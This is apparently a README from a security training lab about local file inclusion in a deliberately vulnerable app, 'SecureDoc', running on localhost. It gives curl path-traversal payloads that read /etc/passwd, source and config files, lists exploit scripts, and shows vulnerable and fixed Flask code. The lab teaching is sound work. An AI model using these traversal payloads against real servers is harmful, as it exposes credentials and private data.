# SecureDoc LFI Exploits

## Overview
Local File Inclusion vulnerabilities in SecureDoc's document management system.

## Target Application
- **App**: SecureDoc
- **Port**: 5000
- **Vulnerability**: LFI in document/file operations
- **Severity**: CRITICAL

## Available Exploits

### 1. directory_traversal.py
Path traversal to read arbitrary files.

### 2. lfi_basic.py
Basic LFI exploitation.

**Usage**:
```bash
python directory_traversal.py http://localhost:5000
python lfi_basic.py http://localhost:5000
```

## Exploitation

```bash
# Read /etc/passwd
curl "http://localhost:5000/document/view?file=../../../../etc/passwd"

# Read application source
curl "http://localhost:5000/document/view?file=../app.py"

# Read config
curl "http://localhost:5000/document/view?file=../config.py"
```

## Testing Steps

1. **Start SecureDoc**:
```bash
cd ../../projects/securedoc  
docker-compose up -d
```

2. **Test LFI**:
```bash
python directory_traversal.py http://localhost:5000
```

## Defense

**Vulnerable**:
```python
filename = request.args.get('file')
return open(filename).read()
```

**Fixed**:
```python
from werkzeug.utils import secure_filename
import os

DOCS_DIR = '/app/documents'
filename = secure_filename(request.args.get('file'))
filepath = os.path.join(DOCS_DIR, filename)

if not os.path.abspath(filepath).startswith(DOCS_DIR):
    abort(403)

return send_file(filepath)
```

## Notes
**WARNING**: LFI can expose source code, credentials, and sensitive data.

## Related
- See `../rce/` for LFI-to-RCE escalation
- See `../../fileshare/lfi/` for more LFI techniques

## References
- OWASP LFI: https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.1-Testing_for_Local_File_Inclusion
